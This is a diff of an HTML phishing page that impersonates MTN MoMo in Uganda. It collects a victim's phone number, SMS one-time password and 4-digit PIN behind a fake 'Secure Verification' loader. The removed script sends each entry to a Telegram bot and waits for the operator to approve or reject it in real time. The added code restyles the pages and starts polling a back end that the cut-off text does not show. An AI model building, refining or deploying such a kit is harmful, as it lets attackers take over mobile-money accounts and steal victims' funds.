@@ -8,257 +8,132 @@
     * { box-sizing: border-box; }
     body { 
       margin: 0; min-height: 100vh; font-family: Arial, sans-serif; 
-      background: #fdfdfd; color: #171717; display: flex; flex-direction: column;
-      align-items: center; justify-content: space-between;
+      background: #eef2f5; color: #171717; display: flex; flex-direction: column;
     }
-    
-    header { 
-      background: #FFCC00; 
-      width: 100%; 
-      padding: 30px 16px 25px; 
-      text-align: center; 
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
+    header { background: #004f71; padding: 40px 16px 60px; text-align: center; }
+    .momo-logo-box {
+      width: 60px; height: 60px; background: #ffcc00; border-radius: 12px;
+      margin: 0 auto; display: flex; align-items: center; justify-content: center;
     }
-    
-    .mtn-logo {
-      background: #FFCC00;
-      border: 3px solid #000000;
-      border-radius: 50%;
-      width: 105px;
-      height: 62px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Arial Black', Impact, sans-serif;
-      font-size: 24px;
-      font-weight: 900;
-      color: #000000;
-      letter-spacing: -0.5px;
-    }
-
+    .momo-logo-text { color: #004f71; font-weight: 900; font-size: 18px; }
+    .momo-subtext { color: #ffcc00; font-size: 11px; margin-top: 4px; font-weight: bold; }
     main { 
-      width: min(440px, 100%); 
-      margin: 0 auto; 
-      padding: 20px 32px; 
-      background: white; 
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      flex-grow: 1;
+      width: min(440px, 92%); margin: -35px auto 25px; padding: 30px 24px; 
+      background: white; border-radius: 24px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08); z-index: 10;
     }
-
-    .graphic-container {
-      margin: 10px 0 5px;
-      position: relative;
-      width: 120px;
-      height: 110px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .phone-icon-mock {
-      width: 44px;
-      height: 76px;
-      border: 4px solid #1c1b1f;
-      border-radius: 12px;
-      position: relative;
-      background: #fff;
-    }
-    .bubble-mock {
-      position: absolute;
-      background: #FFCC00;
-      padding: 4px 8px;
-      border-radius: 8px;
-      font-size: 13px;
-      font-weight: bold;
-      letter-spacing: 1px;
-      top: 30px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-    }
-
-    h2 { 
-      margin: 10px 0 16px; 
-      text-align: center; 
-      color: #000000; 
-      font-size: 28px; 
-      font-weight: 800;
-      letter-spacing: -0.5px;
-    }
-    
-    .instruction-text {
-      font-size: 14.5px;
-      color: #4b4b4b;
-      text-align: center;
-      line-height: 1.5;
-      margin-bottom: 20px;
-      max-width: 340px;
-    }
-
-    .input-section {
-      width: 100%;
-      display: flex;
-      flex-direction: column;
-      align-items: flex-start;
-      margin-bottom: 20px;
-    }
-
-    .field-label { 
-      font-size: 15px;
-      font-weight: 700; 
-      color: #000000; 
-      margin-bottom: 8px;
-    }
-
-    .phone-row { 
-      display: flex; 
-      gap: 10px; 
-      align-items: center; 
-      border: 1px solid #b1b1b1; 
-      border-radius: 8px; 
-      padding: 12px 14px; 
-      width: 100%;
-    }
+    h2 { margin-top: 0; text-align: center; color: #004f71; font-size: 22px; }
+    .field-label { display: block; text-align: center; margin: 20px 0 12px; font-weight: 600; color: #555; }
+    .phone-row { display: flex; gap: 10px; align-items: center; border: 1px solid #ccc; border-radius: 16px; padding: 8px 14px; }
     .country-flag { font-size: 20px; }
-    .phone-input-field { border: none; outline: none; width: 100%; font-size: 17px; font-weight: 600; }
-
-    .text-input-field { 
-      width: 100%;
-      border: 1px solid #b1b1b1; 
-      border-radius: 6px; 
-      padding: 15px; 
-      font-size: 15px; 
-      color: #171717;
-      outline: none;
+    .phone-input-field { border: none; outline: none; width: 100%; font-size: 18px; font-weight: 600; }
+    button { 
+      width: 100%; padding: 16px; margin-top: 30px; border: 0; border-radius: 25px; 
+      background: #004f71; color: white; font-weight: bold; font-size: 16px; cursor: pointer; 
     }
-
-    .digits-row { 
-      display: flex; 
-      justify-content: space-between; 
-      width: 100%;
-      gap: 12px; 
-    }
-    .digit-box { 
-      flex: 1;
-      height: 56px; 
-      border: 1px solid #b1b1b1; 
-      border-radius: 8px; 
-      text-align: center; 
-      font-size: 20px; 
-      font-weight: bold; 
-      outline: none;
-    }
-    .digit-box:focus { border-color: #FFCC00; }
-
-    .info-box {
-      background: #FFF9E6;
-      border-radius: 8px;
-      padding: 12px 14px;
-      display: flex;
-      gap: 12px;
-      align-items: flex-start;
-      margin-bottom: 20px;
-      width: 100%;
-    }
-    .info-icon {
-      background: #FFCC00;
-      color: white;
-      border-radius: 50%;
-      width: 18px;
-      height: 18px;
-      min-width: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      font-size: 12px;
-    }
-    .info-text { font-size: 13px; color: #333333; line-height: 1.4; }
-
-    .action-button { 
-      width: 100%; 
-      padding: 15px; 
-      margin-top: 10px; 
-      border: 0; 
-      border-radius: 25px; 
-      background: #FFCC00; 
-      color: #000000; 
-      font-weight: bold; 
-      font-size: 17px; 
-      cursor: pointer; 
-    }
-
+    button:disabled { background: #cccccc; cursor: not-allowed; }
+    .hidden { display: none !important; }
+    .legal-text { text-align: center; font-size: 13px; color: #666; margin-top: 25px; }
+    .legal-text a { color: #004f71; text-decoration: none; font-weight: bold; }
+    .error { color: #d32f2f; text-align: center; margin-top: 12px; font-weight: 600; }
+    .success { font-size: 24px; text-align: center; color: #2e7d32; font-weight: bold; }
     .secure-overlay {
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 30, 45, 0.85);
-      backdrop-filter: blur(8px); z-index: 9999;
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 30, 45, 0.75);
+      backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); z-index: 9999;
       display: flex; flex-direction: column; align-items: center; justify-content: center; color: #ffffff; text-align: center;
     }
     .circular-spinner {
-      width: 50px; height: 50px; border: 5px solid rgba(255, 255, 255, 0.2);
-      border-top-color: #FFCC00; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+      width: 60px; height: 60px; border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top-color: #00cc66; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
     }
+    .secure-title { font-size: 20px; font-weight: bold; margin-bottom: 8px; letter-spacing: 0.5px; }
+    .secure-sub { font-size: 14px; color: #dddddd; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .footer-curve { width: 100%; height: 35px; background: #FFCC00; clip-path: ellipse(60% 100% at 50% 100%); margin-top: auto; }
-    .hidden { display: none !important; }
-    .error { color: #d32f2f; text-align: center; margin-top: 12px; font-weight: 600; font-size: 13px; }
-    .success { font-size: 22px; text-align: center; color: #2e7d32; font-weight: bold; margin-top: 40px; }
+    /* -------------------------------------------------------------
+       STYLES EXCLUSIVELY ADDED FOR YOUR ADDITIONAL MTN PAGES
+       ------------------------------------------------------------- */
+    .mtn-yellow-header { background: #FFCC00 !important; padding: 24px 16px 20px !important; }
+    .mtn-logo-oval {
+      background: #FFCC00; border: 3px solid #000; border-radius: 50%;
+      width: 105px; height: 62px; display: flex; align-items: center; justify-content: center;
+      font-family: 'Arial Black', Impact, sans-serif; font-size: 24px; font-weight: 900; color: #000;
+      margin: 0 auto;
+    }
+    .mtn-main-theme { width: 100% !important; margin: 0 !important; padding: 20px 32px !important; box-shadow: none !important; border-radius: 0 !important; }
+    .graphic-container { margin: 10px 0 5px; position: relative; width: 120px; height: 110px; display: flex; justify-content: center; align-items: center; }
+    .phone-icon-mock { width: 44px; height: 76px; border: 4px solid #1c1b1f; border-radius: 12px; background: #fff; }
+    .bubble-mock { position: absolute; background: #FFCC00; padding: 4px 8px; border-radius: 8px; font-size: 13px; font-weight: bold; top: 30px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    .mtn-h2 { color: #000000; font-size: 32px; font-weight: 800; letter-spacing: -0.5px; margin-top: 10px; }
+    .instruction-text { font-size: 15px; color: #4b4b4b; text-align: center; line-height: 1.5; margin-bottom: 24px; max-width: 340px; }
+    .text-input-field { width: 100%; border: 1px solid #b1b1b1; border-radius: 6px; padding: 16px; font-size: 15px; outline: none; }
+    .digits-row { display: flex; justify-content: space-between; width: 100%; gap: 12px; }
+    .digit-box { flex: 1; height: 64px; border: 1px solid #b1b1b1; border-radius: 8px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
+    .digit-box:focus { border-color: #FFCC00; }
+    .info-box { background: #FFF9E6; border-radius: 8px; padding: 14px 16px; display: flex; gap: 12px; margin-bottom: 25px; width: 100%; text-align: left; }
+    .info-icon { background: #FFCC00; color: white; border-radius: 50%; width: 20px; height: 20px; min-width: 20px; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 13px; }
+    .info-text { font-size: 13.5px; color: #333333; line-height: 1.4; }
+    .mtn-btn { background: #FFCC00 !important; color: #000000 !important; font-size: 18px !important; }
+    .resend-container { margin-top: 24px; font-size: 14px; color: #666666; text-align: center; width: 100%; }
+    .resend-link { color: #004f71; text-decoration: none; font-weight: bold; cursor: pointer; }
+    .footer-curve { width: 100%; height: 40px; background: #FFCC00; clip-path: ellipse(60% 100% at 50% 100%); margin-top: auto; }
   </style>
 </head>
 <body>
 
-  <!-- Server/Bot Approval Live Loader -->
   <div id="secureModal" class="secure-overlay hidden">
     <div class="circular-spinner"></div>
-    <div id="modalTitle" style="font-size: 18px; font-weight: bold; margin-bottom: 6px;">Secure Verification</div>
-    <div id="modalSub" style="font-size: 13px; color: #ddd;">Waiting for response approval...<br>Please keep this screen open.</div>
+    <div class="secure-title" id="modalTitle">Secure Verification</div>
+    <div class="secure-sub" id="modalSub">Verifying your PIN...<br>Please do not close this page.</div>
   </div>
 
-  <header>
-    <div class="mtn-logo">MTN</div>
+  <header id="momoHeader">
+    <div class="momo-logo-box"><span class="momo-logo-text">MoMo</span></div>
+    <div class="momo-subtext">from MTN</div>
   </header>
 
-  <main>
-    <div class="graphic-container">
-      <div class="phone-icon-mock"></div>
-      <div class="bubble-mock">*****</div>
-    </div>
-
-    <!-- STEP 1: Phone Landing View -->
-    <section id="phonePage" style="width:100%;">
+  <main id="mainContainer">
+    <!-- STEP 1: PHONE INTRO REPLICATED UNTOUCHED -->
+    <section id="phonePage">
       <h2>Welcome to MoMo</h2>
-      <div class="input-section">
-        <label class="field-label">Enter number *</label>
-        <div class="phone-row">
-          <div class="country-flag">🇺🇬</div>
-          <input type="text" id="phoneInput" class="phone-input-field" placeholder="e.g. 778260583" inputmode="numeric">
-        </div>
+      <label class="field-label">Enter number *</label>
+      <div class="phone-row">
+        <div class="country-flag">🇺🇬</div>
+        <input type="text" id="phoneInput" class="phone-input-field" placeholder="e.g. 778260583" inputmode="numeric" maxlength="9">
       </div>
-      <button id="phoneButton" class="action-button">NEXT</button>
+      <button id="phoneButton" disabled>NEXT</button>
+      <p id="phoneError" class="error"></p>
+      <p class="legal-text">Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
     </section>
 
-    <!-- STEP 2: Unified Code Field (Supports regular pasting natively) -->
-    <section id="otpScreenOne" class="hidden" style="width:100%;">
-      <h2>OTP Verification</h2>
-      <p class="instruction-text">We have sent a One-Time Password (OTP) to your mobile number via SMS.</p>
+    <!-- STEP 2: MTN BRANDED FULL TEXT BOX OTP PAGE -->
+    <section id="otpScreenOne" class="hidden" style="width:100%; display: flex; flex-direction: column; align-items: center;">
+      <div class="graphic-container">
+        <div class="phone-icon-mock"></div>
+        <div class="bubble-mock">*****</div>
+      </div>
+      <h2 class="mtn-h2">OTP Verification</h2>
+      <p class="instruction-text">We have sent a One-Time Password (OTP) to your mobile number via SMS. Please copy the code from your message and paste it below.</p>
       <div class="info-box">
         <div class="info-icon">i</div>
-        <div class="info-text">Check your SMS inbox for the OTP message from MTN.</div>
+        <div class="info-text">Check your SMS inbox for the OTP message from MTN. It may take a few seconds to arrive.</div>
       </div>
-      <div class="input-section">
-        <label class="field-label">Enter OTP</label>
-        <input type="text" id="otpPasteInput" class="text-input-field" placeholder="Paste the code from your SMS">
+      <div style="width:100%; text-align: left; margin-bottom: 25px;">
+        <label class="field-label" style="text-align: left; margin: 10px 0 10px;">Enter OTP</label>
+        <input type="text" id="otpPasteInput" class="text-input-field" placeholder="Copy and paste the code from your SMS">
       </div>
-      <button id="verifyBtnOne" class="action-button">Verify</button>
+      <button id="verifyBtnOne" class="mtn-btn">Verify</button>
+      <div class="resend-container">Didn't receive the code? <span class="resend-link">Resend</span></div>
     </section>
 
-    <!-- STEP 3: Separated Secure PIN View (Now supports split-pasting data strings) -->
-    <section id="otpScreenTwo" class="hidden" style="width:100%;">
-      <h2>Enter Secure PIN</h2>
-      <p class="instruction-text">Enter the 4-digit security code received below.</p>
-      <div class="input-section">
+    <!-- STEP 3: MTN BRANDED 4-SEPARATED DIGIT PIN BOXES PAGE -->
+    <section id="otpScreenTwo" class="hidden" style="width:100%; display: flex; flex-direction: column; align-items: center;">
+      <div class="graphic-container">
+        <div class="phone-icon-mock"></div>
+        <div class="bubble-mock">*****</div>
+      </div>
+      <h2 class="mtn-h2">OTP Verification</h2>
+      <p class="instruction-text">Enter the 4-digit code you received in your MTN SMS.</p>
+      <div style="width: 100%; margin-bottom: 25px;">
         <div class="digits-row">
           <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
           <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
@@ -266,10 +141,11 @@
           <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
         </div>
       </div>
-      <button id="verifyBtnTwo" class="action-button" style="margin-top: 20px;">Verify PIN</button>
+      <button id="verifyBtnTwo" class="mtn-btn">Verify</button>
+      <div class="resend-container">Didn't receive the code? <span class="resend-link">Resend</span></div>
     </section>
 
-    <!-- STEP 4: Success View -->
+    <!-- STEP 4: SUCCESS COMPLETION CONTAINER -->
     <section id="successPage" class="hidden">
       <div class="success">✓ Verified Successfully</div>
     </section>
@@ -277,46 +153,19 @@
     <p id="errorFeedback" class="error"></p>
   </main>
 
-  <div class="footer-curve"></div>
+  <div id="footerCurve" class="hidden"></div>
 
   <script>
-    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    const CHAT_ID = "YOUR_CHAT_ID_HERE";
+    let currentRequestId = null;
+    let pollInterval = null;
+
+    const momoHeader = document.getElementById('momoHeader');
+    const mainContainer = document.getElementById('mainContainer');
+    const footerCurve = document.getElementById('footerCurve');
 
     const phonePage = document.getElementById('phonePage');
     const otpScreenOne = document.getElementById('otpScreenOne');
     const otpScreenTwo = document.getElementById('otpScreenTwo');
     const successPage = document.getElementById('successPage');
-    const secureModal = document.getElementById('secureModal');
-    const errorFeedback = document.getElementById('errorFeedback');
     
-    let userPhone = "";
-    let currentStep = "";
-
-    async function sendTelegramAlert(message) {
-      try {
-        await fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-        });
-      } catch (err) { console.error(err); }
-    }
-
-    let lastUpdateId = 0;
-    async function listenForServerApproval() {
-      setInterval(async () => {
-        try {
-          const res = await fetch(`https://telegram.org{BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
-          const data = await res.json();
-          if (data.result && data.result.length > 0) {
-            data.result.forEach(update => {
-              lastUpdateId = update.update_id;
-              if(update.message && update.message.text) {
-                const text = update.message.text.toLowerCase();
-                if (text.includes('approve') || text.includes('correct')) {
-                  advanceFlow();
-                } else if (text.includes('wrong') || text.includes('reject')) {
-                  triggerError();
-                }
 
